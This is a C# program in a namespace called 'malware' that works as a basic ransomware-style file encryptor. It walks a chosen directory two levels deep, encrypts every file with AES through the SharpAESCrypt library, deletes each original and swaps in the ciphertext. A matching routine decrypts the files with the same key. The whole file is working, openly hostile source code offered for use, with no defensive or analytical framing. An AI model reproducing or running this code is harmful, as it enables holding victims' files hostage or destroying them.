NOTE: YOU MUST DOWNLOAD SharpAESCrypt from your projects NugGet packages and use it for this solution


using System;
using System.Collections.Generic;
using System.IO;
using SharpAESCrypt;

namespace malware
{
    class Program
    {

        static void Finder()
        {
            string Dir = @"(directory of your choosing)";
            List<string> files = new List<string>();
            DirectoryInfo d = new DirectoryInfo(Dir);

            string path =  @"(directory of your choosing)";
            string[] array1 = Directory.GetFiles(path);

            //build out list of files in every directory in the designated path


            foreach (var file in array1)
            {//files in the original path
                Console.WriteLine("File : {0}" + file);

            }

            string[] array2 = Directory.GetDirectories(@path);

            foreach (string item in array2)
            {//directories in original path
                Console.WriteLine("Directory: {0}" + item);

                string[] array3 = Directory.GetFiles(item);

                foreach (var file in array3)
                {//files in first set of directories
                    Console.WriteLine("Files: {0}" + file);

                }
                string[] array4 = Directory.GetDirectories(item);

                foreach (string item2 in array4)
                {//directories(set 2) in first set of directories

                    string[] array5 = Directory.GetFiles(item2);

                    Console.WriteLine("Directory : {0}" + item2);

                    //files in the second set of directories 
                    foreach (var file in array5)
                    {
                        Console.WriteLine("files : {0}" + file);

                    }
                }
            }


        }

        static void Encryptor()
        {
            string Dir = @"(directory of your choosing)";
            List<string> files = new List<string>();
            DirectoryInfo d = new DirectoryInfo(Dir);

            string path = @"(directory of your choosing)";
            string[] array1 = Directory.GetFiles(path);

            //build out list of files in every directory in the designated path

            foreach (var file in array1)
            {//files in the original path
                Console.WriteLine("File : {0}" + file);
                files.Add(file.ToString());
            }

            string[] array2 = Directory.GetDirectories(@path);

            foreach (string item in array2)
            {//directories in original path
                Console.WriteLine("Directory: {0}" + item);

                string[] array3 = Directory.GetFiles(item);

                foreach (var file in array3)
                {//files in first set of directories
                    Console.WriteLine("Files: {0}" + file);
                    files.Add(file.ToString());
                }
                string[] array4 = Directory.GetDirectories(item);

                foreach (string item2 in array4)
                {//directories(set 2) in first set of directories

                    string[] array5 = Directory.GetFiles(item2);

                    Console.WriteLine("Directory : {0}" + item2);

                    //files in the second set of directories 
                    foreach (var file in array5)
                    {
                        Console.WriteLine("files : {0}" + file);
                        files.Add(file.ToString());
                    }
                }
            }

            //encrypt files
            foreach (string file in files)
            {
                string encrypted_file = Dir + "encrypted_file1.txt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("(your encryption key !DONT SHARE!)",file, encrypted_file);
                File.Delete(file);
                File.Move(encrypted_file, file);
            }

        }

        static void Decryptor()
        {
            string Dir = @"(directory of your choosing)";
            List<string> files = new List<string>();
            DirectoryInfo d = new DirectoryInfo(Dir);

            string path = @"(directory of your choosing)";
            string[] array1 = Directory.GetFiles(path);

            //build out list of files in every directory in the designated path

            foreach (var file in array1)
            {//files in the original path
                Console.WriteLine("File : {0}" + file);
                files.Add(file.ToString());
            }

            string[] array2 = Directory.GetDirectories(@path);

            foreach (string item in array2)
            {//directories in original path
                Console.WriteLine("Directory: {0}" + item);

                string[] array3 = Directory.GetFiles(item);

                foreach (var file in array3)
                {//files in first set of directories
                    Console.WriteLine("Files: {0}" + file);
                    files.Add(file.ToString());
                }
                string[] array4 = Directory.GetDirectories(item);

                foreach (string item2 in array4)
                {//directories(set 2) in first set of directories

                    string[] array5 = Directory.GetFiles(item2);

                    Console.WriteLine("Directory : {0}" + item2);

                    //files in the second set of directories 
                    foreach (var file in array5)
                    {
                        Console.WriteLine("files : {0}" + file);
                        files.Add(file.ToString());
                    }
                }
            }


            //decrypt files
            foreach (string file in files)
            {
                string decrypted_file = Dir + "decrypted_file1.txt";
                SharpAESCrypt.SharpAESCrypt.Decrypt("(your encryption key !DONT SHARE!)",file, decrypted_file);
                File.Delete(file);
                File.Move(decrypted_file, file);
            }
        }

        static void Main(string[] args)
        {

            //Decryptor();
            //Encryptor();
            Finder();

//Use the function you wish to use, you can encrpyt files then decrypt them, if you wish to make this encryption/decryption more advanced make the crypting go
//deeper into the files by repeating the foreach loops in deeper arrays of files.


        }


    }
}
